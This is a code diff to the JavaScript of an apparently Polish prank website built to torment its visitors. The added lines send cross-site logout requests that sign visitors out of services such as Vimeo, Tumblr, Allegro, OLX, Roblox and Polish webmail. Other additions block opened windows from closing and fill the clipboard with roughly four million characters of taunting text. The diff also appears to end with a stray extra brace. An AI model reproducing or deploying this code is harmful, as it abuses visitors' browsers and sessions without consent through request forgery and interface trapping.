@@ -105,7 +105,14 @@ const LOGOUT_SITES = {
   Wordpress: ['GET', 'https://wordpress.com/wp-login.php?action=logout'],
   Yahoo: ['GET', 'https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=https://www.yahoo.com/'],
   YouTube: ['POST', 'https://www.youtube.com', { action_logout: '1' }],
-  JShop: ['GET', 'https://jshop.partners/panel/logout']
+  JShop: ['GET', 'https://jshop.partners/panel/logout'],
+  Vimeo: ['GET', 'https://vimeo.com/log_out'], // added by @intexpression
+  Tumblr: ['GET', 'https://www.tumblr.com/logout'], // added by @intexpression
+  Allegro: ['GET', 'https://allegro.pl/wyloguj?origin_url=/'], // added by @intexpression
+  OnetMail: ['GET', 'https://authorisation.grupaonet.pl/logout.html?state=logout&client_id=poczta.onet.pl.front.onetapi.pl'], // added by @intexpression
+  InteriaMail: ['GET', 'https://poczta.interia.pl/logowanie/sso/logout'], // added by @intexpression
+  OLX: ['GET', 'https://www.olx.pl/account/logout'], // added by @intexpression
+  Roblox:  ['POST', 'https://auth.roblox.com/v2/logout'] // added by @cryblanka
 }
 
 /**
@@ -114,9 +121,14 @@ const LOGOUT_SITES = {
 const wins = []
 
 /**
- * Count of number of clicks
+ * Count of number of clicks  - added by @9fm
  */
+
 let interactionCount = 0
+
+//Bardzo dlugi string xd, ciulowa implementacja ale to chyba lepsze niz ~ 4 miliony znakow w pliku poprostu - added by @9fm
+
+const veryLongString = repeatStringNumTimes(repeatStringNumTimes('zostałeś zptoszkowany!!1 ',100),1500) // - added by @9fm
 
 /**
  * Number of iframes injected into the page for the "super logout" functionality.
@@ -141,6 +153,7 @@ const isParentWindow = !isChildWindow
 /*
  * Run this code in all windows, *both* child and parent windows.
  */
+
 init()
 
 /*
@@ -214,7 +227,6 @@ function initChildWindow () {
   registerProtocolHandlers()
   hideCursor()
   moveWindowBounce()
-  setupFollowWindow()
   startVideo()
   detectWindowClose()
   triggerFileDownload()
@@ -250,7 +262,7 @@ function initParentWindow () {
       removeHelloMessage()
       rainbowThemeColor()
       animateUrlWithEmojis()
-      speak('That was a mistake')
+      speak('To był błąd')
     }
   })
 }
@@ -413,7 +425,7 @@ function animateUrlWithEmojis () {
   }
 
   function animateUrlWithMoons () {
-    const f = ['🐶', '🤛']
+    const f = ['🌑', '🌘', '🌗', '🌖', '🌕', '🌔', '🌓', '🌒']
     const d = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
     let m = 0
 
@@ -562,6 +574,24 @@ function openWindow () {
   wins.push(win)
 
   if (wins.length === 2) setupSearchWindow(win)
+
+  // Added by @wetraks
+  win.onunload = function () {
+    // Some browsers might not support onunload, but include it for completeness
+    return false;
+  };
+
+  // For modern browsers
+  win.addEventListener("beforeunload", function (e) {
+    e.preventDefault();
+    e.returnValue = "";
+  });
+
+  // For older browsers
+  win.onbeforeunload = function () {
+    return "";
+  };
+  // Added by @wetraks
 }
 
 /**
@@ -670,8 +700,8 @@ function requestWebauthnAttestation () {
         // User:
         user: {
           id: new Uint8Array(16),
-          name: 'aro@tubson.pl',
-          displayName: 'Arek Wojcik'
+          name: 'lolica@jaczup.me',
+          displayName: 'Ptoszek Jaczupa'
         },
 
         pubKeyCredParams: [{
@@ -797,7 +827,6 @@ function moveWindowBounce () {
   }, TICK_LENGTH)
 }
 
-
 /**
  * Show a random troll video in the window.
  */
@@ -862,13 +891,20 @@ function rainbowThemeColor () {
     meta.setAttribute('content', '#' + zeroFill(6, Math.floor(Math.random() * 16777215).toString(16)))
   }, 50)
 }
-
+function repeatStringNumTimes(string, times) {
+  var repeatedString = "";
+  while (times > 0) {
+    repeatedString += string;
+    times--;
+  }
+  return repeatedString;
+}
 /**
- * Copy cat pictures onto the user's clipboard. Requires user-initiated event.
+ * Kopiuje ~4 miliony znaków do schowka  - added by @9fm
  */
+
 function copySpamToClipboard () {
-  const randomArt = getRandomArrayEntry(ART) + '\nSprawdz https://ptoszek.pl/'
-  clipboardCopy(randomArt)
+  clipboardCopy(veryLongString)
 }
 
 /**
@@ -1093,4 +1129,4 @@ function setupSearchWindow (win) {
       searchIndex += 1
     }, 500)
   }, 2500)
-}
+}}
